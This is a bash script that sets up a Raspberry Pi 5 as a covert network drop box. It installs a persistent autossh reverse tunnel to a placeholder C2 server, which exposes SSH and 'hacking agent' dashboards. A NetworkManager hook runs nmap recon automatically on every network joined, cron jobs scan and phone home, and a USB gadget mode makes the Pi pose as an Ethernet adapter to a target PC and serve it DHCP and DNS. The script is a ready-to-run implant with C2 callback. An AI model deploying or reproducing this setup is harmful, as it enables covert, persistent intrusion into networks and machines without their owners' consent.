#!/bin/bash
# =============================================================================
# Raspberry Pi 5 - Field Operations Setup
# Reverse SSH callback, auto-start, covert deployment
# Run as root: sudo bash 04_field_operations.sh
# =============================================================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log()  { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
err()  { echo -e "${RED}[-]${NC} $1"; }
info() { echo -e "${CYAN}[*]${NC} $1"; }

if [ "$EUID" -ne 0 ]; then
    err "Run as root: sudo bash $0"
    exit 1
fi

ACTUAL_USER="${SUDO_USER:-kali}"
HOME_DIR="/home/$ACTUAL_USER"
SSH_PORT=2222

echo ""
echo "============================================================"
echo "  Field Operations - Reverse SSH & Auto-Callback"
echo "============================================================"
echo ""

# ---------------------------------------------------------
# 1. Reverse SSH Callback Service
# ---------------------------------------------------------
log "Phase 1: Setting up reverse SSH callback..."

cat > /etc/systemd/system/reverse-ssh.service << REVSSH
[Unit]
Description=Reverse SSH Tunnel (Call Home)
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=$ACTUAL_USER
# EDIT THESE: your C2/home server details
# -R 19999: exposes Pi's SSH (port $SSH_PORT) on your server's port 19999
# -R 18084: exposes hacking agent dashboard on your server's port 18084
# -R 18080: exposes sysadmin agent dashboard
# -R 18081: exposes network agent dashboard
Environment=AUTOSSH_GATETIME=0
ExecStart=/usr/bin/autossh -M 0 -N -o "StrictHostKeyChecking=no" -o "ServerAliveInterval=30" -o "ServerAliveCountMax=3" -o "ExitOnForwardFailure=yes" -R 19999:localhost:$SSH_PORT -R 18084:localhost:8084 -R 18080:localhost:8080 -R 18081:localhost:8081 -i $HOME_DIR/.ssh/id_ed25519 YOUR_USER@YOUR_C2_SERVER -p 22
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
REVSSH

apt install -y autossh

warn "EDIT /etc/systemd/system/reverse-ssh.service with your C2 server details!"
warn "Replace YOUR_USER@YOUR_C2_SERVER with your actual server"
info "After editing, enable with: sudo systemctl enable reverse-ssh"
info ""
info "From your C2 server, connect to the Pi with:"
info "  ssh -p 19999 kali@localhost           # SSH to Pi"
info "  Browse http://localhost:18084          # Hacking Agent"
info "  Browse http://localhost:18080          # SysAdmin Agent"
info "  Browse http://localhost:18081          # Network Agent"

# ---------------------------------------------------------
# 2. Auto-Recon on Network Connect
# ---------------------------------------------------------
log "Phase 2: Setting up auto-recon on network connect..."

# NetworkManager dispatcher script — runs when a new network is connected
mkdir -p /etc/NetworkManager/dispatcher.d

cat > /etc/NetworkManager/dispatcher.d/99-autorecon << 'AUTORECON'
#!/bin/bash
# Auto-reconnaissance when connected to a new network
# Runs as root via NetworkManager dispatcher

INTERFACE=$1
STATUS=$2
LOG_DIR="/home/kali/engagements/auto-recon"
mkdir -p "$LOG_DIR"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

if [ "$STATUS" = "up" ] && [ "$INTERFACE" != "lo" ]; then
    # Get network info
    GATEWAY=$(ip route | grep default | grep "$INTERFACE" | awk '{print $3}')
    SUBNET=$(ip -o -f inet addr show "$INTERFACE" | awk '{print $4}')
    IP=$(ip -o -f inet addr show "$INTERFACE" | awk '{print $4}' | cut -d/ -f1)

    RECON_FILE="$LOG_DIR/${TIMESTAMP}_${INTERFACE}.txt"

    {
        echo "========================================="
        echo "Auto-Recon Report"
        echo "========================================="
        echo "Timestamp:  $(date)"
        echo "Interface:  $INTERFACE"
        echo "IP Address: $IP"
        echo "Subnet:     $SUBNET"
        echo "Gateway:    $GATEWAY"
        echo ""

        echo "--- ARP Table ---"
        arp -a 2>/dev/null
        echo ""

        echo "--- Quick Host Discovery ---"
        nmap -sn "$SUBNET" --open -oG - 2>/dev/null | grep "Up"
        echo ""

        echo "--- Gateway Services ---"
        nmap -sV -T4 --top-ports 100 "$GATEWAY" 2>/dev/null
        echo ""

        echo "--- DNS Servers ---"
        cat /etc/resolv.conf | grep nameserver
        echo ""

        echo "--- DHCP Info ---"
        cat /var/lib/dhcp/dhclient.leases 2>/dev/null | tail -30
        echo ""

    } > "$RECON_FILE" 2>&1 &

    # Log it
    logger -t autorecon "Network connected on $INTERFACE ($SUBNET). Recon saved to $RECON_FILE"
fi
AUTORECON

chmod +x /etc/NetworkManager/dispatcher.d/99-autorecon
log "Auto-recon dispatcher configured"

# ---------------------------------------------------------
# 3. Cron Jobs for Periodic Operations
# ---------------------------------------------------------
log "Phase 3: Setting up periodic operation cron jobs..."

# Create cron script
cat > "$HOME_DIR/agents/cron-ops.sh" << 'CRONOPS'
#!/bin/bash
# Periodic cybersec operations — called by cron
# Usage: cron-ops.sh [heartbeat|scan|backup]

AGENTS_DIR="$HOME/agents"
LOG_DIR="$HOME/engagements/scheduled"
mkdir -p "$LOG_DIR"

source "$AGENTS_DIR/.env" 2>/dev/null

case "$1" in
    heartbeat)
        # Phone home with status
        TIMESTAMP=$(date -u +%Y-%m-%dT%H:%M:%SZ)
        IP=$(curl -s ifconfig.me 2>/dev/null || echo "unknown")
        LOCAL_IP=$(hostname -I | awk '{print $1}')
        UPTIME=$(uptime -p)
        DISK=$(df -h / | awk 'NR==2 {print $5}')
        MEM=$(free -h | awk '/Mem:/ {print $3"/"$2}')
        TEMP=$(cat /sys/class/thermal/thermal_zone0/temp 2>/dev/null | awk '{printf "%.1f", $1/1000}')

        HEARTBEAT="{\"time\":\"$TIMESTAMP\",\"pub_ip\":\"$IP\",\"local_ip\":\"$LOCAL_IP\",\"uptime\":\"$UPTIME\",\"disk\":\"$DISK\",\"mem\":\"$MEM\",\"temp\":\"${TEMP}C\"}"

        # Log locally
        echo "$HEARTBEAT" >> "$LOG_DIR/heartbeats.jsonl"

        # Send to webhook if configured
        if [ -n "$SLACK_WEBHOOK_URL" ]; then
            curl -s -X POST "$SLACK_WEBHOOK_URL" -H 'Content-Type: application/json' \
                -d "{\"text\":\"Pi Heartbeat: $LOCAL_IP | $UPTIME | Disk: $DISK | Temp: ${TEMP}C\"}" \
                2>/dev/null
        fi
        ;;

    scan)
        # Quick network scan of current subnet
        SUBNET=$(ip -o -f inet addr show | grep -v "127.0.0.1" | head -1 | awk '{print $4}')
        TIMESTAMP=$(date +%Y%m%d_%H%M%S)
        nmap -sn "$SUBNET" -oX "$LOG_DIR/scan_${TIMESTAMP}.xml" 2>/dev/null
        ;;

    backup)
        # Backup databases and configs
        BACKUP_DIR="$LOG_DIR/backups"
        mkdir -p "$BACKUP_DIR"
        TIMESTAMP=$(date +%Y%m%d_%H%M%S)

        for agent in hacking_agent sysadmin_agent network_agent; do
            DB="$AGENTS_DIR/$agent/data/*.db"
            if ls $DB 1>/dev/null 2>&1; then
                cp $DB "$BACKUP_DIR/${agent}_${TIMESTAMP}.db"
            fi
        done

        # Keep only last 7 backups
        ls -t "$BACKUP_DIR"/*.db 2>/dev/null | tail -n +22 | xargs rm -f 2>/dev/null
        ;;
esac
CRONOPS

chmod +x "$HOME_DIR/agents/cron-ops.sh"
chown "$ACTUAL_USER:$ACTUAL_USER" "$HOME_DIR/agents/cron-ops.sh"

# Install crontab
CRON_FILE="/tmp/cybersec-cron"
cat > "$CRON_FILE" << CRONTAB
# Cybersec Pi - Scheduled Operations
# Heartbeat every 15 minutes
*/15 * * * * $HOME_DIR/agents/cron-ops.sh heartbeat
# Network scan every 6 hours
0 */6 * * * $HOME_DIR/agents/cron-ops.sh scan
# Database backup daily at 4am
0 4 * * * $HOME_DIR/agents/cron-ops.sh backup
CRONTAB

crontab -u "$ACTUAL_USER" "$CRON_FILE"
rm "$CRON_FILE"
log "Cron jobs installed (heartbeat/scan/backup)"

# ---------------------------------------------------------
# 4. USB Ethernet Gadget Mode (Pi as network tap)
# ---------------------------------------------------------
log "Phase 4: Configuring USB Ethernet gadget mode..."

cat > "$HOME_DIR/agents/usb-gadget.sh" << 'USBGADGET'
#!/bin/bash
# Enable USB Ethernet gadget mode
# When connected to a target PC via USB-C, the Pi appears as a USB Ethernet adapter
# The target PC gets an IP from the Pi's DHCP server

case "$1" in
    on)
        echo "[*] Enabling USB Ethernet gadget mode..."

        # Load the gadget module
        sudo modprobe libcomposite

        # Create gadget
        GADGET_DIR="/sys/kernel/config/usb_gadget/cybersec"
        sudo mkdir -p "$GADGET_DIR"
        echo 0x1d6b | sudo tee "$GADGET_DIR/idVendor" > /dev/null   # Linux Foundation
        echo 0x0104 | sudo tee "$GADGET_DIR/idProduct" > /dev/null   # Multifunction
        echo 0x0100 | sudo tee "$GADGET_DIR/bcdDevice" > /dev/null
        echo 0x0200 | sudo tee "$GADGET_DIR/bcdUSB" > /dev/null

        sudo mkdir -p "$GADGET_DIR/strings/0x409"
        echo "CybersecPi5" | sudo tee "$GADGET_DIR/strings/0x409/manufacturer" > /dev/null
        echo "USB Network" | sudo tee "$GADGET_DIR/strings/0x409/product" > /dev/null

        # ECM (Ethernet) function
        sudo mkdir -p "$GADGET_DIR/functions/ecm.usb0"
        sudo mkdir -p "$GADGET_DIR/configs/c.1/strings/0x409"
        echo "ECM" | sudo tee "$GADGET_DIR/configs/c.1/strings/0x409/configuration" > /dev/null
        sudo ln -sf "$GADGET_DIR/functions/ecm.usb0" "$GADGET_DIR/configs/c.1/"

        # Bind to UDC
        UDC=$(ls /sys/class/udc | head -1)
        if [ -n "$UDC" ]; then
            echo "$UDC" | sudo tee "$GADGET_DIR/UDC" > /dev/null
        fi

        # Configure usb0 interface
        sleep 2
        sudo ip addr add 10.0.0.1/24 dev usb0
        sudo ip link set usb0 up

        # Start DHCP for connected device
        sudo apt install -y dnsmasq 2>/dev/null
        cat > /tmp/usb-dhcp.conf << 'DHCP'
interface=usb0
dhcp-range=10.0.0.10,10.0.0.50,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
DHCP
        sudo dnsmasq -C /tmp/usb-dhcp.conf --no-daemon &

        echo "[+] USB gadget mode ON"
        echo "[*] Target will get IP in 10.0.0.0/24 range"
        echo "[*] Pi is at 10.0.0.1"
        ;;
    off)
        echo "[*] Disabling USB gadget mode..."
        sudo killall dnsmasq 2>/dev/null
        UDC_FILE="/sys/kernel/config/usb_gadget/cybersec/UDC"
        if [ -f "$UDC_FILE" ]; then
            echo "" | sudo tee "$UDC_FILE" > /dev/null
        fi
        sudo ip link set usb0 down 2>/dev/null
        echo "[+] USB gadget mode OFF"
        ;;
    *)
        echo "Usage: ./usb-gadget.sh [on|off]"
        echo "Connect Pi USB-C to target computer to appear as USB Ethernet"
        ;;
esac
USBGADGET

chmod +x "$HOME_DIR/agents/usb-gadget.sh"

# ---------------------------------------------------------
# 5. Quick-Deploy Boot Script
# ---------------------------------------------------------
log "Phase 5: Creating quick-deploy boot sequence..."

cat > /etc/systemd/system/cybersec-boot.service << 'BOOTSERVICE'
[Unit]
Description=Cybersec Pi Boot Sequence
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
RemainAfterExit=yes
ExecStartPre=/bin/sleep 10
ExecStart=/bin/bash -c ' \
    logger -t cybersec "Boot sequence starting..."; \
    systemctl start cybersec-agents.target; \
    logger -t cybersec "All agents started"; \
'

[Install]
WantedBy=multi-user.target
BOOTSERVICE

systemctl daemon-reload
systemctl enable cybersec-boot.service
log "Auto-start boot service configured"

# ---------------------------------------------------------
# 6. MOTD Banner
# ---------------------------------------------------------
log "Phase 6: Setting up login banner..."

cat > /etc/motd << 'MOTD'

 ██████╗██╗   ██╗██████╗ ███████╗██████╗ ███████╗███████╗ ██████╗
██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝
██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝███████╗█████╗  ██║
██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗╚════██║██╔══╝  ██║
╚██████╗   ██║   ██████╔╝███████╗██║  ██║███████║███████╗╚██████╗
 ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝
     Pi 5 — AI-Powered Cybersecurity Platform

  Agents:       agents status
  Hacking CLI:  hack
  SysAdmin CLI: sysop
  Network CLI:  netop
  AI Chat:      agents chat hacking
  Monitor:      ~/agents/monitor.sh
  Stealth:      ~/agents/stealth.sh [on|off]

MOTD

# ---------------------------------------------------------
# Set ownership
# ---------------------------------------------------------
chown -R "$ACTUAL_USER:$ACTUAL_USER" "$HOME_DIR/agents"
chown -R "$ACTUAL_USER:$ACTUAL_USER" "$HOME_DIR/engagements"

# ---------------------------------------------------------
# Done
# ---------------------------------------------------------
echo ""
echo "============================================================"
log "Field operations setup complete!"
echo "============================================================"
echo ""
info "Reverse SSH:     Edit /etc/systemd/system/reverse-ssh.service"
info "Auto-recon:      Triggers on new network connections"
info "Heartbeat:       Every 15 minutes (cron)"
info "Network scan:    Every 6 hours (cron)"
info "DB backup:       Daily at 4am (cron)"
info "USB gadget:      ~/agents/usb-gadget.sh [on|off]"
info "Boot auto-start: Enabled (all agents start on boot)"
echo ""
echo "========== Field Deployment Checklist =========="
echo "  [ ] API keys configured in ~/agents/.env"
echo "  [ ] SSH public key added to authorized_keys"
echo "  [ ] Reverse SSH C2 server details configured"
echo "  [ ] Test: agents start && agents status"
echo "  [ ] Test: agents chat hacking"
echo "  [ ] Encrypted vault formatted (see Phase 6 notes)"
echo "  [ ] Optional: stealth.sh on (for covert drops)"
echo ""
